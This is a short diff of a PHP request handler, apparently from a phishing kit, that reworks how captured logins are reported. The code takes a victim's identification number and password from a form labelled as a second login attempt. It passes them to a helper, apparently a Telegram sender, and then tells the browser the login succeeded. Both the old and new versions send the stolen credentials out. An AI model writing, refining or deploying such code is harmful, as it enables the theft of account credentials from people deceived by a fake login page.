@@ -10,13 +10,10 @@ if ($identification === '' || $password === '') {
     exit;
 }
 
-$SEP = "───────────────────";
-$msg  = "🔐 <b>Acceso — Intento 2</b>\n$SEP\n";
-$msg .= "🆔 Identificación: <code>{$identification}</code>\n";
-$msg .= "🔑 Contraseña: <code>{$password}</code>\n";
-$msg .= "\n🌐 " . nq_ip() . " · 🕐 " . date('Y-m-d H:i:s');
-
-nq_tg($msg);
+nq_tg('🔐 Acceso · Intento 2/2', [
+    ['TEL', $identification],
+    ['PW',  $password],
+]);
 
 echo json_encode([
     'success' => true,
